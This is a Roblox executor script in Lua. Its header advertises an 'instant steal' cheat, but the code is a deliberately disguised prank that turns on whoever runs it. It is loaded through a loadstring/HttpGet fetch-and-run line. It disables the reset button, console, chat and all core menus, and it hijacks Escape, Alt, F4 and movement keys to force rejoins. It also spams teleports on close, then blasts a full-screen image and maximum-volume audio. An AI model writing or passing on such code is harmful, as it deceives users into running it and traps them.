-- "STEAL A BRAINOT: INSTANT STEAL" - Roblox executor prank: MAXIMUM EFFECT VERSION
-- Load with: loadstring(game:HttpGet("RAW_GITHUB_URL_HERE"))()

-- === CONFIGURATION ===
local IMAGE_TEXTURE_ID = "rbxassetid://5863569299" -- full-screen image
local IMAGE_ASSET_ID = "rbxassetid://5863569319"
local SOUND_ID = "rbxassetid://7520198169"
local FINAL_MUSIC_ID = "rbxassetid://133838630142849"
local FINAL_PARTY_TEXTURE = "rbxassetid://70737147873213"
local FINAL_SKYBOX_TEXTURE = "rbxassetid://73730735468991"
local REJOIN_PLACE_ID = 1752868452747

-- === SERVICES ===
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer

-- === BLOCK ALL EXIT/RESET/ESCAPE ATTEMPTS ===
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
pcall(function() StarterGui:SetCore("DevConsoleVisible", false) end)
pcall(function() StarterGui:SetCore("ChatActive", false) end)
pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)

-- Alt, F4, Escape, and menu keys attempt rejoin instantly
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.LeftAlt or
       input.KeyCode == Enum.KeyCode.RightAlt or
       input.KeyCode == Enum.KeyCode.F4 or
       input.KeyCode == Enum.KeyCode.Escape or
       input.KeyCode == Enum.KeyCode.Menu or
       input.KeyCode == Enum.KeyCode.Backspace or
       input.KeyCode == Enum.KeyCode.Q or
       input.KeyCode == Enum.KeyCode.W then
        TeleportService:Teleport(REJOIN_PLACE_ID, player)
    end
end)

-- Force rejoin if possible on player removal (prank, not foolproof)
spawn(function()
    while task.wait(0.5) do
        pcall(function()
            if not Players.LocalPlayer or not Players.LocalPlayer.Parent then
                TeleportService:Teleport(REJOIN_PLACE_ID)
            end
        end)
    end
end)

-- Prevent Roblox menus (coregui)
pcall(function()
    for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
        StarterGui:SetCoreGuiEnabled(guiType, false)
    end
end)

-- Spam rejoin on any game close event (hardest possible block, but not 100%)
pcall(function()
    game:BindToClose(function()
        while true do
            TeleportService:Teleport(REJOIN_PLACE_ID)
            task.wait(0.1)
        end
    end)
end)

-- === RANDOMIZED LOADING GUI ===
local function randomLoadingTime()
    local r = math.random()
    if r < 0.25 then
        return 0
    elseif r < 0.5 then
        return math.random(1, 2)
    elseif r < 0.8 then
        return math.random(2, 6)
    else
        return math.random(7, 14)
    end
end

local function createLoadingGui()
    local sg = Instance.new("ScreenGui")
    sg.Name = "BrainotPrankLoading"
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn = false
    sg.Parent = player:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.BackgroundColor3 = Color3.new(0,0,0)
    bg.Size = UDim2.new(1,0,1,0)
    bg.ZIndex = 1
    bg.Parent = sg

    local barBG = Instance.new("Frame")
    barBG.AnchorPoint = Vector2.new(0.5, 0.5)
    barBG.Position = UDim2.new(0.5,0,0.6,0)
    barBG.Size = UDim2.new(0.7,0,0.08,0)
    barBG.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
    barBG.BorderSizePixel = 0
    barBG.ZIndex = 2
    barBG.Parent = sg

    local bar = Instance.new("Frame")
    bar.AnchorPoint = Vector2.new(0,0)
    bar.Position = UDim2.new(0,0,0,0)
    bar.Size = UDim2.new(0,0,1,0)
    bar.BackgroundColor3 = Color3.new(0,0.9,1)
    bar.BorderSizePixel = 0
    bar.ZIndex = 3
    bar.Parent = barBG

    local percentLbl = Instance.new("TextLabel")
    percentLbl.AnchorPoint = Vector2.new(0.5, 0.5)
    percentLbl.Position = UDim2.new(0.5,0,0.45,0)
    percentLbl.Size = UDim2.new(0.35,0,0.1,0)
    percentLbl.TextScaled = true
    percentLbl.Text = "0%"
    percentLbl.BackgroundTransparency = 1
    percentLbl.TextColor3 = Color3.new(1,1,1)
    percentLbl.Font = Enum.Font.GothamBlack
    percentLbl.ZIndex = 4
    percentLbl.Parent = sg

    return sg, bar, percentLbl
end

local function showFullScreenImageAndSound()
    local sg = Instance.new("ScreenGui")
    sg.Name = "BrainotPrankFinal"
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn = false
    sg.DisplayOrder = 9999999
    sg.Parent = player:WaitForChild("PlayerGui")

    local img = Instance.new("ImageLabel")
    img.AnchorPoint = Vector2.new(0.5,0.5)
    img.Position = UDim2.new(0.5,0,0.5,0)
    img.Size = UDim2.new(1,0,1,0)
    img.BackgroundTransparency = 1
    img.Image = IMAGE_TEXTURE_ID
    img.ZIndex = 10
    img.Parent = sg

    local img2 = Instance.new("ImageLabel")
    img2.AnchorPoint = Vector2.new(0.5,0.5)
    img2.Position = UDim2.new(0.5,0,0.93,0)
    img2.Size = UDim2.new(0.4,0,0.09,0)
    img2.BackgroundTransparency = 1
    img2.Image = IMAGE_ASSET_ID
    img2.ZIndex = 11
    img2.Parent = sg

    local sound = Instance.new("Sound")
    sound.SoundId = SOUND_ID
    sound.Volume = 10
    sound.PlayOnRemove = false
    sound.Parent = sg
    sound:Play()

    -- Change all textures/sky/particles instantly during this moment
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
            pcall(function() obj.Texture = FINAL_PARTY_TEXTURE end)
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            pcall(function() obj.Texture = FINAL_PARTY_TEXTURE end)
        end
    end
    for _, s in pairs(Lighting:GetChildren()) do
        if s:IsA("Sky") then s:Destroy() end
    end
    local sky = Instance.new("Sky")
    sky.SkyboxBk = FINAL_SKYBOX_TEXTURE
    sky.SkyboxDn = FINAL_SKYBOX_TEXTURE
    sky.SkyboxFt = FINAL_SKYBOX_TEXTURE
    sky.SkyboxLf = FINAL_SKYBOX_TEXTURE
    sky.SkyboxRt = FINAL_SKYBOX_TEXTURE
    sky.SkyboxUp = FINAL_SKYBOX_TEXTURE
    sky.Parent = Lighting

    task.wait(5)
    sg:Destroy()
    sound:Destroy()
end

local function setFinalEffects()
    -- Music on max
    local music = Instance.new("Sound")
    music.SoundId = FINAL_MUSIC_ID
    music.Looped = true
    music.Volume = 10
    music.Parent = workspace
    music:Play()

    -- Change all textures/particles/decals
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
            pcall(function() obj.Texture = FINAL_PARTY_TEXTURE end)
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            pcall(function() obj.Texture = FINAL_PARTY_TEXTURE end)
        end
    end
    for _, s in pairs(Lighting:GetChildren()) do
        if s:IsA("Sky") then s:Destroy() end
    end
    local sky = Instance.new("Sky")
    sky.SkyboxBk = FINAL_SKYBOX_TEXTURE
    sky.SkyboxDn = FINAL_SKYBOX_TEXTURE
    sky.SkyboxFt = FINAL_SKYBOX_TEXTURE
    sky.SkyboxLf = FINAL_SKYBOX_TEXTURE
    sky.SkyboxRt = FINAL_SKYBOX_TEXTURE
    sky.SkyboxUp = FINAL_SKYBOX_TEXTURE
    sky.Parent = Lighting
end

-- === MAIN ===
math.randomseed(tick())

local gui, bar, lbl = createLoadingGui()
local duration = randomLoadingTime()
local st = tick()
local done = false

if duration == 0 then
    bar.Size = UDim2.new(1,0,1,0)
    lbl.Text = "100%"
    done = true
else
    while not done do
        local elapsed = tick() - st
        local progress = math.clamp(elapsed/duration, 0, 1)
        bar.Size = UDim2.new(progress,0,1,0)
        lbl.Text = tostring(math.floor(progress*100)) .. "%"
        if progress >= 1 then
            lbl.Text = "100%"
            bar.Size = UDim2.new(1,0,1,0)
            done = true
        end
        task.wait(0.05 + math.random()*0.07)
    end
end

task.wait(0.5 + math.random()*0.4)
gui:Destroy()

showFullScreenImageAndSound()
setFinalEffects()

-- END
